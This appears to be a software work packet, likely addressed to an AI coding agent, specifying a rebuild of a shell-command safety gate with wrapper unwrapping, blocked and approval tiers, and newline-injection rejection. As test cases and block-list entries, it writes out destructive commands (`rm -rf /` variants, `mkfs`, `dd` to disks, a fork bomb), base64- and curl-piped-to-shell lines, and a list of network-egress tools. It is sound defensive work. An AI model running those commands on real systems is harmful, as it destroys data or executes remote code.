# PKT-P1 — Permission lattice residual (command gate rebuild)

Tier: **opus**   Milestone: **M3**   Effort: **M**
Collision lane: **C,H**   Merge order: **3/4 in C; 3/3 in H**
Verified against: halbert `main` @ `fbd725e9` (2026-09-11)

---

## 1. Packet

**P1** — Permission lattice residual (command gate rebuild).

## 2. User problem

The command gate in halbert_core/halbert_core/tools/safety.py classifies shell commands with unanchored raw-regex patterns searched against the whole raw string (_classify_command, safety.py:845-941; BLOCKED_PATTERNS at :249-258; RULES at :261+). Anything that reaches a shell through a wrapper reads as ordinary text: `env FOO=1 python3 -Ic 'import os;os.system("rm -rf /")'`, `bash -lc "rm -rf /"`, `xargs rm -rf`, `find . -exec rm -rf {} +`, `sudo -S sh`, base64-piped-to-shell. None of those is anchored to command position after argv-normalisation, so the gate never sees the payload as a command. Separately: (a) the staged-command path in halbert_core/halbert_core/dashboard/routes/terminal.py writes raw bytes to a live PTY with no gate — `/sessions/{id}/stage` (:407-423) and `/sessions/{id}/input` (:355-364) call session.write_stdin() without _gate_command(), while the spawn/run endpoints do gate (:262, :327) — so an embedded `\n` in staged text executes, breaking the standing directive "commands staged from the UI are staged, never executed"; (b) there is no argv/schema validation at the executor seam — safety._classify_builtin (safety.py:635-637) does args.get("command","").strip(), so classify('run_command', {'command': ['rm','-rf','/']}) raises AttributeError from inside executor.execute (executor.py:637, self.safety.classify(...)) BEFORE the try block at ~:718 — a weak local model that mangles tool arguments gets an unhandled crash instead of a correctable refusal, and the handler _run_command (executor.py:890) then does args["command"] with no type check; (c) network-egress binaries (curl, wget, nc, telnet) are not classified HIGH regardless of chain position; (d) there is no creation-time hard reject of self-restart/self-kill job shapes (launchctl/systemctl/pkill naming Halbert's own unit). Note: the shell=True in approval/simulator.py:176 was already removed by the merged SEC-2 remediation — this packet must not re-fix it, only assert it stays gone. Verdict in FINAL-CRITICAL-DISCOVERY-BACKLOG-2026-09-11.md: ACCEPT — "Permission lattice residual — real, distinct from R-08." R-08 strengthened the permission lattice, not the command classifier; no merged R-packet covers tools/safety.py.

## 3. What to build

Rebuild the command gate inside halbert_core/halbert_core/tools/safety.py and wire the seam in halbert_core/halbert_core/tools/executor.py, plus gate the staged-command endpoints in halbert_core/halbert_core/dashboard/routes/terminal.py. Concretely:

1. Two-tier classifier replacing the flat RULES scan in safety.py. HARDLINE tier (always blocked, never confirmable): root/system rm (rm -rf / , rm -rf /*), mkfs.*, dd of=/dev/[sh]d[a-z] and > /dev/sd|hd|nvme, fork bomb `:(){ :|:& };:`, shutdown/reboot/halt/poweroff/init 0|6, `sudo -S`, and base64-piped-to-shell (`base64 -d ... | sh`/`bash`). DANGEROUS tier (requires approval unless allowlisted): recursive/forced delete, chmod -R, chown -R, package-manager install/remove, systemctl start/stop/restart/enable/disable, and the network-egress set below. Classification is anchored at command position, not searched as raw text.

2. argv-normalisation tables in safety.py. Before matching, normalise the line: (a) unwrap shell wrappers — `bash|sh|zsh -c|-lc|-rc CMD`, `eval`, `command`, `exec` — classify the inner CMD; (b) unwrap command carriers — `env KEY=VAL ... CMD`, `xargs CMD`, `find ... -exec CMD`, `sudo CMD`, `nice`/`ionice`/`timeout CMD` — classify the carried CMD; (c) recognise interpreter inline-eval flags — `python -c`, `python -Ic`, `python -m`, `perl -e`, `ruby -e`, `osascript -e` — and treat their payload as a command string that itself goes through the classifier recursively (depth-capped). After normalisation, `env FOO=1 python3 -Ic '...'` and `bash -lc "rm -rf /"` classify on the payload, not the wrapper. Keep _every_segment_is_safe semantics (test_safety_chained_commands.py contract): a SAFE verdict may only speak for a line the gate can see all of.

3. Network-egress HIGH set in safety.py: curl, wget, nc/ncat/netcat, telnet, ssh/scp/sftp/ftp, openssl s_client, socat — classify HIGH regardless of chain position (this settles open todo D1 per founder decision F-A9). A SAFE rule may not vouch for a line containing one of these at command position.

4. Staged-command gating in dashboard/routes/terminal.py. Route both /sessions/{id}/stage (:407-423) and /sessions/{id}/input (:355-364) through the same gate the spawn/run endpoints use (_gate_command at :227, built on check_command_safety at :173), and add a staged-text reject: any `\n`, `\r`, or Ctrl-M in text bound for stage_into_shell is refused with 400 before write_stdin — staging writes one line, never a script. This restores "staged, never executed" as a true statement.

5. Schema validation at the executor seam in executor.py. Before self.safety.classify(...) at :637, validate model-produced args against the registered tool's declared schema (run_command.command must be a str; write_file.path/content str; etc.). A type violation returns ExecutionResult(success=False, error=<correctable refusal naming the field and expected type>) — never an AttributeError escaping past the try block. Move the classify call inside the existing try or pre-validate so a malformed call is a refusal the model can correct, not a crash.

6. Self-restart/self-kill creation-time hard reject in safety.py: a command line that names Halbert's own unit/process — launchctl bootout|kill|stop naming the Halbert launchd label, systemctl stop|restart|kill naming halbert units, pkill/kill matching the Halbert server process — is HARDLINE-blocked at classification time (medium priority per the deep-eval; include it since the tables make it cheap).

7. Regression assertion for the already-merged SEC-2 fix: a test asserting approval/simulator.py contains no subprocess/shell=True execution path (static scan or import-level assertion), so the simulator stays static-analysis-only.

All classification remains deterministic — no model anywhere in the gate. Confirmation-message fences from get_confirmation_message (safety.py:961+) that embed the command should size fences to content (max(3, longest_backtick_run+1)) where touched, but the full presentation builder is P2's, not this unit's.

## 4. What NOT to build

Do NOT rebuild the permission lattice, approvals, leases, or the ask axis — that is merged R-08 and P2's reshaped residual (approval-presentation builder, authorisation-as-a-field on register(), hash-bound one-shot approvals, blocked-event taxonomy). Do NOT build the full approval-presentation builder — the fence-sizing helper is touched only where this unit's confirmation messages embed a command; the single-producer sanitising builder belongs to P2. Do NOT re-fix approval/simulator.py's shell=True — the SEC-2 remediation already removed it (the code at simulator.py:165-190 is now static analysis with an explicit comment); this unit only adds the regression assertion. Do NOT change MEDIUM-runs-unattended policy for unrecognised commands — the test_safety_chained_commands.py header names that as standing policy question todo D1 for unrecognized commands generally; this unit only settles the network-egress leg (F-A9). Do NOT touch MCP-side security (merged R-09) or skill safety constraints (_check_skill_safety, safety.py:508-560 stays as-is — skills tighten, never loosen). Do NOT add heredoc-body masking beyond what the argv tables need — the deep-eval says heredoc masking is a false-positive fix worth doing only after the argv tables land; if it slips, it goes to the M5b tail. Do NOT build any UI surface, approval countdown, or keyboard chords. No migrations, no back-compat shims for old persisted rules.

## 5. Target files
- `halbert_core/halbert_core/tools/safety.py`
- `halbert_core/halbert_core/tools/executor.py`

## 6. Dependencies

None — may dispatch immediately.

## 7. Effort

**M** — M is justified because the work is table-building plus seam wiring in three named files, not a new subsystem. The two-tier classifier and argv-normalisation tables are a rewrite of _classify_command's matching core inside safety.py (the file already has the right shape: RiskLevel enum, SafetyRule, SafetyCheckResult, _command_segments, _shell_segments, _every_segment_is_safe to build on). The staged-command gate is small: terminal.py already has _gate_command and the spawn/run endpoints show the exact call pattern; the stage/input endpoints need the same call plus a control-character reject. The executor schema validation is a pre-dispatch type check against already-declared tool schemas, returning an ExecutionResult — no new plumbing. What keeps it from being S is correctness surface: every normalisation rule is a new evasion class that needs its own red test (env, xargs, find -exec, sudo, bash -lc, python -Ic, base64|sh, egress binaries, self-kill shapes, the AttributeError-as-refusal case), and the classifier must not regress the existing SAFE-segment contract pinned by test_safety_chained_commands.py and test_secret_reads.py. The deep-eval explicitly judged effort justified: the unanchored regex is a real security gap, the staged-command newline injection breaks a standing directive, and schema validation matters more for Halbert than the origin because local models mangle arguments routinely.

## 8. UX rationale

This is the enforcement layer under the watched-terminal and one-seamless-conversation surfaces; nothing user-visible is added, but two visible promises become true. First, "commands staged from the UI are staged, never executed" — today a staged command containing an embedded newline executes in the user's watched PTY, which is exactly the betrayal the watched-terminal design (subtle indicator, agent-owned terminal, user presses Enter) exists to prevent; after this lands, staged text is one line at an empty prompt or it is refused. Second, when a weak local model emits a malformed tool call, the conversation gets a correctable refusal in first person ("I couldn't run that — the command argument wasn't text") instead of a crashed turn in the one seamless conversation, which has no conversation list to retreat to. Risk communication stays on the existing surface: the confirmation message names the matched rule and reason deterministically, speaks as the computer itself, uses no emoji and no model names, and colours stay in shared-tokens (no new surface, so nothing to token-check). The network-egress HIGH classification means curl-to-pipe-shell now asks first — a visible confirmation where today there is silent execution, which is the intended behaviour change, not friction to hide.

## 9. Acceptance criteria

1. safety.classify("run_command", {"command": c}) returns risk_level CRITICAL and allowed=False for each of: `rm -rf /`, `bash -lc "rm -rf /"`, `sh -c 'rm -rf /*'`, `env FOO=1 rm -rf /`, `xargs rm -rf /`, `find / -exec rm -rf {} +`, `sudo rm -rf /`, `sudo -S sh`, `mkfs.ext4 /dev/sda`, `dd if=/dev/zero of=/dev/sda`, `:(){ :|:& };:`, `shutdown -h now`, `echo AAAA | base64 -d | sh`, and `python3 -Ic 'import os; os.system("rm -rf /")'`.
2. curl/wget/nc/telnet (and ssh/scp/sftp/socat) classify HIGH (requires_confirmation=True) even mid-chain, e.g. `ls && curl https://example.com/x.sh | sh` is not SAFE and not MEDIUM-auto.
3. classify("run_command", {"command": ["rm","-rf","/"]}) (list, not str) returns a SafetyCheckResult/ExecutionResult failure — no AttributeError; executor.execute on the same args returns ExecutionResult(success=False) with an error naming the field, and no exception escapes execute().
4. POST /api/terminal/sessions/{id}/stage with command containing `\n` returns 400 (and /input with gated content returns 403); a normal one-line stage still returns {"ok": true, "staged": ...}. Verified against the FastAPI route handlers in dashboard/routes/terminal.py.
5. A command naming Halbert's own unit (launchctl bootout gui/501/<halbert-label>, systemctl stop halbert*, pkill -f halbert server) is CRITICAL/blocked.
6. Existing contracts unchanged: test_safety_chained_commands.py and test_secret_reads.py still pass; SAFE verdicts still only for fully-visible lines; skills can still only tighten.
7. approval/simulator.py contains no subprocess invocation (static assertion passes).

## 10. Verification (measured state, not model judgment)

Runnable, measured-state checks (never model judgment):

1. New regression file halbert_core/tests/test_command_gate.py covering every acceptance item 1-3 and 5-6, run with: `arch -arm64 .venv/bin/python -m pytest halbert_core/tests/test_command_gate.py halbert_core/tests/test_safety_chained_commands.py halbert_core/tests/test_secret_reads.py -x -q` — exit code 0. (In a worktree: `arch -arm64 ./wt_pytest.py halbert_core/tests/test_command_gate.py`.) The test asserting item 3 does `asyncio.run(executor.execute("run_command", {"command": ["rm","-rf","/"]}))`-equivalent via the executor fixture and asserts result.success is False with no raised exception.

2. Staged-command gate: route-level test (TestClient against the terminal router, pattern follows existing dashboard route tests) asserting stage with embedded `\n` → HTTP 400, gated dangerous stage → 403, clean one-line stage → 200; plus a live check with the backend up (`make dev-web`): `curl -s -o /dev/null -w '%{http_code}' -X POST localhost:8000/api/terminal/sessions/<id>/stage -H 'content-type: application/json' -d '{"command":"ls\nrm -rf /"}'` prints 400.

3. shell=True regression assertion: `grep -n "shell=True" halbert_core/halbert_core/approval/simulator.py` exits 1 (no match; the only hit today is inside the removal comment — the test greps for an actual subprocess/os.system call instead via ast).

4. No-baseline-regression: full suite `arch -arm64 .venv/bin/python -m pytest halbert_core/tests -x -q` (collect ~8,500 in ~8s when the arch prefix is right) — failure count at or below the merge-base baseline (main is not green; take a baseline run first per CLAUDE.md).

## 11. Exclusions

Heredoc-body masking for regex guards — deferred to the M5b tail per the deep-eval ("worth doing only after the argv tables land"); the argv tables land in this unit, masking follows in M5b. Approval-presentation builder (sanitising every emitted field, fence-sizing as single producer) — goes to P2's reshaped residual; this unit only touches fences where its own confirmation messages embed commands. Authorisation-as-a-required-field on register() and the uniform blocked-event taxonomy — P2 (they need the descriptor on register(), explicitly P2's prerequisite). Hash-bound one-shot approvals, base-hash guards on policy writes, approval expiry/fail-closed — P2 (verify against merged R-08 there). Approval UI features (countdown, command-span highlighting, stale-resolution classing, keyboard chords) — P2 deferred slice, ships after the presentation builder. Consent explain / permission explain surfaces, zero-tool first-contact turn, presence/camera session-visibility filtering — P2 deferred slice. The self-restart/kill guard is included here (cheap once tables exist) but was rated medium priority in the deep-eval; if it slips it goes to the M5b tail, not to another unit. MCP-boundary and lattice/lease work — already merged (R-09, R-08); not rebuilt here or anywhere. Per the RESHAPE discipline, nothing in this unit is dropped wholesale; every named exclusion has a destination.

---

## OSS reference

Greenfield — no direct OSS reference; see the deep-eval.

## Repo traps

- Every Python test run needs the `arch -arm64` prefix: `arch -arm64 .venv/bin/python -m pytest halbert_core/tests`.
- From a git worktree use `arch -arm64 ./wt_pytest.py halbert_core/tests`, NEVER bare pytest (the editable install pins halbert_core to the MAIN tree).
- `main` is NOT green. Known-red baseline (2026-09-11): test_agent_model_override.py, test_agent_model_selected_event.py, test_no_model_names_in_user_facing_source.py, test_num_ctx.py (~23 failures). A failure is yours iff absent from this baseline.
- Work in a git worktree; narrow commits; concurrent sessions edit this repo.
- NEVER add Co-Authored-By or 'Generated with …' trailers. Subject + body only.
- No emoji anywhere. Colours only from shared-tokens/tokens.css (run scripts/check_contrast.py).
- Never name/recommend an AI model on any user-facing surface; connection slots, not model menus.
- Model locality: is_local_model() (model/llm_config.py:181) is the ONLY judge; :cloud tag is primary.
- Feature gating: has_capability() (capabilities.py:499); never _is_home_variant.
- Redaction: ingestion/redaction_registry.py enforced at security/display_transport.py; scrub BEFORE the model.
- Commands staged from the UI are staged, never executed.
- No users yet: no migrations/back-compat shims unasked; leave superseded data on disk, unread, never delete.
- Line references drift: re-anchor by grep before editing; a failed anchor is a rebase signal, not a spec change.
- Modify only this packet's Target files. .handoff/ is correspondence, not authority (ROADMAP.md + DECISIONS.md are the spine).
